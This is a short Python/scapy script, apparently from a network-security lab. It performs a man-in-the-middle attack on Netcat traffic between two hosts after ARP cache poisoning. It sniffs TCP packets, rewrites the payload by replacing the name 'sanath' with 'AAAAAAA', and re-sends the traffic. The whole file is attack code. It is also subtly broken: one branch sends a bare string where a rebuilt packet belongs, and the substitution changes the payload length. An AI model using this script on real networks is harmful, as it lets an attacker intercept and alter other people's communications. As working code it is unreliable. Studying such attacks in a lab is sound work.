#!/usr/bin/env python3 
from scapy.all import *
IP_A= "10.9.0.5"
MAC_A = "02:42:08:09:00:05"
IP_B="10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M="10.9.0.105"
MAC_M = "02:42:0a:09:00:69"
print("LAUNCHING MITM attack on Netcat using ARP Cache Poisoning")
def spoof_pkt(pkt):
    if pkt [IP].src == IP_A and pkt [IP].dst == IP_B:
         newpkt = IP(bytes (pkt [IP]))
         del (newpkt.chksum)
         del (newpkt [TCP].payload)
         del (newpkt [TCP].chksum)

         if pkt[TCP].payload:
             data = pkt[TCP].payload.load
             print("**** %s, length: %d" % (data, len(data)))
             newdata = re.sub(r'sanath', r'AAAAAAA', data.decode())
             print("Updated data::::"+newdata)
             send(newdata)
         else:
             send (newpkt)

    elif pkt [IP].src == IP_B and pkt [IP].dst == IP_A: 
         newpkt =IP (bytes (pkt [IP]))
         del (newpkt.chksum)
         del (newpkt [TCP].chksum)
         send(newpkt)

f='tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)